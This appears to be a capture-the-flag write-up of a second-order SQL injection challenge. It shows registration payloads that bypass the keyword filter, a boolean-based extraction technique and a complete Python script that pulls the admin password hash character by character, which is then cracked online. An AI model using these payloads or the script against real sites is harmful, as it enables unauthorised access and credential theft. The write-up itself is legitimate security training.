## Recon

First, I fuzzed the register function with this payload:
```
username=administrator'#&email=1&password=1&re_password=1&submit=Register
```
It registered successfully, and the `#` comment is not blocked, although the server filters almost every keyword such as `union`, `select`, `and`, spaces, and so on.

Then I logged in with `username=administrator'#`. Even though I set the email to `1` during registration, right after logging in an email appeared that likely belongs to the admin account: `admin@rootme.com`. So the SQL injection probably happens at the username field during registration.

![alt text](image-15.png)

This is a **second-order injection**, as the challenge title suggests: the payload is stored during registration and only executes later, when the login page reads the stored username back into another query.

When I log in with `administrator'#`, the stored username is embedded into a query as I assumpt is like:
```
select email from users where username = 'administrator'#'
```
The `'` closes the string and `#` comments out the trailing quote, so the query effectively becomes `where username = 'administrator'` and returns the real admin row — which is why `admin@rootme.com` appears.

To confirm this behaves like a boolean condition, I registered two usernames with a true and a false condition:
```
administrator'&&'1'='1'#
administrator'&&'1'='2'#
```
When the condition is true, the logged-in page shows `admin@rootme.com`; when it is false, the page shows `Warning: Trying to access array offset on value of type null in /var/www/html/logged-in.php on line 77`. This difference can use as a boolean signal (no warning means the condition is true).

Now I can extract data one character at a time. Since the query selects from the same `users` table that also stores the `password` column (assumption), I can reference `password` directly inside the condition — without a nested `select` — which also bypasses the `select` keyword filter. The extraction payload is:
```
username=administrator'&&substr(password,{pos},1)='{character}'#
```

I wrote a script to extract the password character by character:
```python
import requests

charset = "0123456789abcdef"

BASE = "http://challenge01.root-me.org:59086/"
LOGIN_URL = BASE + "login.php"
REGISTER_URL = BASE + "login_create.php"
HOME_URL = BASE + "logged-in.php"

password = ""
for pos in range(1,50):
    found = False
    for c in charset:
        payload = f"administrator'&&substr(password,{pos},1)='{c}'#"
        #register
        r = requests.Session()
        r.post(url=REGISTER_URL, data={
            "username" : payload,
            "email" : "1",
            "password" : "1",
            "re_password" : "1",
            "submit" : "Register"
        })
        #login
        respr = r.post(url=LOGIN_URL, data={
            "user" : payload,
            "password" : 1,
            "submit" : "Login"
        },allow_redirects=True)
        if "Trying to access array offset" not in respr.text:
            password += c
            found = True
            print(f"[+] pos {pos}: {c} -> password: {password}")
            break
    if not found:
        print("Done")
        break
print("Password:", password)
```

The extracted password is a 40-character hex string, which is a **SHA1 hash** (I ask AI because I haven't learned about cryptography yet). I then cracked it using https://crackstation.net/ and logged in to the administrator account with the recovered password to obtain the flag.